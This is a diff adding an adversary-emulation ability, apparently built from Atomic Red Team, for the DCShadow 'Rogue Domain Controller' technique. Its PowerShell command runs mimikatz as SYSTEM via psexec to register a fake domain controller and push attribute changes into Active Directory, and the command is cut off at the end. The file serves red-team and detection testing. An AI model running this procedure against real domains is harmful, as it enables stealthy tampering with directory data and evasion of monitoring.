@@ -1,0 +1,22 @@
+- id: b9e92063-f0d2-4feb-b998-7aee4bea145b
+  name: Rogue Domain Controller
+  description: Ability for Rogue Domain Controller (ATT&CK T1207). Generated from
+    Atomic Red Team procedures; review and test safely before use.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1207
+    name: Rogue Domain Controller
+  platforms:
+    windows:
+      psh:
+        command: '# starting fake DC server, as SYSTEM (required) $dc_output_file
+          = "#{atomics_dir}\..\ExternalPayloads\art-T1207-mimikatz-DC.log" Remove-Item
+          $dc_output_file -ErrorAction Ignore $mimikatzParam ="`"log $dc_output_file`"
+          `"lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`"
+          `"exit`"" $dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList
+          "/c ''#{psexec_path}'' /accepteula -d -s #{mimikatz_path} $mimikatzParam"
+          # wait for fake DC server to be ready... Start-Sleep -Seconds 5 # server
+          ready, so trigger replication (push) and wait until it finished & "#{mimikatz_path}"
+          "lsadump::dcshadow /push" "exit" Write-Host "`nWaiting for fake DC server
+          to return" Wait-Process $dc Write-Host "`nOutput from fake DC server:" Get-Content
+          $dc_output_file Start-Sleep 1 # wait …'
